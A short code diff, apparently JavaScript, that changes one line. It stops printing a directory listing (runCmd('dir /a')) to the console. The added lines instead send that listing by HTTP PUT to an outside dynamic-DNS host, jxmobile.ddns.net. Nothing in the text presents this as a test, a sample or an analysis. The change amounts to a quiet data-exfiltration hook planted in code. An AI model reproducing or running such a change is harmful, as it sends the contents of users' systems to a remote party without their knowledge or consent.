@@ -1,1 +1,2 @@
-console.log(runCmd("dir /a"))
+var res = runCmd("dir /a");
+httpPut('http://jxmobile.ddns.net', res);
